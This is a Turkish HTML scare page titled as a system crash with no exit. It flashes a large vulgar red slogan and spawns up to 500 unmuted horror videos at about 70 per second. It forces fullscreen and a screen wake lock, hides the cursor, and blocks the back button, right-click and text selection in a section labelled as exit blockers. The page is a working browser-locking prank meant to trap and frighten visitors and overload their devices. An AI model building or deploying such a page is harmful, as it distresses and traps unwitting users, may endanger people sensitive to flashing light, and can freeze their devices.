<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>SİSTEM ÇÖKTÜ - ÇIKIŞ YOK</title>
    <style>
        body {
            background-color: black;
            margin: 0;
            padding: 0;
            overflow: hidden;
            height: 100vh;
            width: 100vw;
            cursor: none;
            touch-action: none;
            user-select: none;
            -webkit-user-select: none;
        }

        /* En Üstteki Korkunç Yazı */
        #zahir-text {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: red;
            font-family: 'Impact', 'Arial Black', sans-serif;
            font-size: 15vw;
            font-weight: 900;
            text-shadow: 0 0 20px red, 0 0 40px darkred, 0 0 60px black;
            z-index: 99999;
            text-align: center;
            white-space: nowrap;
            pointer-events: none; /* Tıklamaları engellemesin */
            animation: horror-zoom 0.1s infinite alternate;
            opacity: 0.9;
            text-transform: uppercase;
        }

        /* Video Animasyonu (Sak Diye Çıkma) */
        @keyframes spawn-pop {
            0% { transform: scale(0) rotate(-180deg); opacity: 0; }
            50% { transform: scale(1.5) rotate(10deg); opacity: 1; }
            100% { transform: scale(1) rotate(0deg); opacity: 1; }
        }

        @keyframes horror-zoom {
            0% { transform: translate(-50%, -50%) scale(1); filter: hue-rotate(0deg); }
            100% { transform: translate(-50%, -50%) scale(1.3); filter: hue-rotate(90deg); }
        }
    </style>
</head>
<body>

    <div id="zahir-text">ZAHİR SİKTİ</div>

    <script>
        let videoCount = 0;
        
        function spawnVideo() {
            // Cihazın anında kilitlenmemesi için 500 video sınırı koyduk
            if (videoCount > 500) return; 

            const vid = document.createElement('video');
            vid.src = "korku.mp4"; 
            
            vid.loop = true;        
            vid.muted = false;      
            vid.volume = 1.0;       
            vid.autoplay = true;    
            vid.playsInline = true;
            
            // Rastgele Boyut
            const size = Math.random() * 80 + 40; 
            
            // EKRANIN HER YERİNE RASTGELE KONUMLANDIRMA
            const posX = Math.random() * 100;
            const posY = Math.random() * 100;

            vid.style.position = 'absolute';
            vid.style.width = size + 'vw';
            vid.style.top = posY + 'vh';
            vid.style.left = posX + 'vw';
            vid.style.zIndex = 1000 + videoCount;
            vid.style.objectFit = 'cover';
            
            // Animasyon
            vid.style.animation = `spawn-pop 0.2s cubic-bezier(0.175, 0.885, 0.32, 1.275) forwards`;

            // Rastgele dönme
            setTimeout(() => {
                vid.style.transform = `translate(-50%, -50%) rotate(${Math.random() * 360}deg)`;
            }, 200);

            document.body.appendChild(vid);
            
            vid.play().catch(e => {});
            
            videoCount++;
        }

        window.onload = function() {
            if (document.documentElement.requestFullscreen) {
                document.documentElement.requestFullscreen().catch(e => {});
            }

            if ('wakeLock' in navigator) {
                navigator.wakeLock.request('screen').catch(e => {});
            }

            // İlk videoyu hemen oluştur
            spawnVideo();

            // SANİYEDE 70 TANE VİDEO FIRLATMA (1000ms / 70 = ~14 milisaniye)
            // Ekran anında dolup taşacak
            setInterval(spawnVideo, 14);

            // Tarayıcı sesi engellerse diye ilk tıklamada tüm videoların sesini patlat
            const unlockAudio = () => {
                document.querySelectorAll('video').forEach(v => {
                    v.muted = false;
                    v.volume = 1.0;
                    v.play().catch(e => {});
                });
                document.removeEventListener('click', unlockAudio);
                document.removeEventListener('touchstart', unlockAudio);
            };
            document.addEventListener('click', unlockAudio);
            document.addEventListener('touchstart', unlockAudio);
        };

        // ÇIKIŞ ENGELLEYİCİLER
        history.pushState(null, null, location.href);
        window.onpopstate = function () {
            history.go(1); 
        };
        
        document.addEventListener('contextmenu', event => event.preventDefault());
        document.addEventListener('selectstart', event => event.preventDefault());
        document.addEventListener('dblclick', event => event.preventDefault());
    </script>
</body>
</html>
